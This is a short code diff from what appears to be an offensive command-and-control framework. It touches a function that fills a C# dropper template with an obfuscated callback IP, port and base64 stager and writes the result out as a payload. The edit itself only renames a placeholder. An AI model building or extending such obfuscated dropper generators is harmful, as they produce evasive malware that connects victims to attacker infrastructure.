@@ -68,7 +68,7 @@ def cspayload():
     fp = open('agents/simple_dropper.ninja', 'r')
     fpo= open('payloads/cs_dropper.cs', 'w')
     cs = fp.read()
-    cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b52_stager}', csobf(b52_stager)).replace('{http}', csobf("http://"))
+    cs = cs.replace('{ip}', csobf(HOST)).replace('{port}', csobf(PORT)).replace('{b64_stager}', csobf(b64_stager)).replace('{http}', csobf("http://"))
     fpo.write(cs)
     fpo.close()
     fp.close()
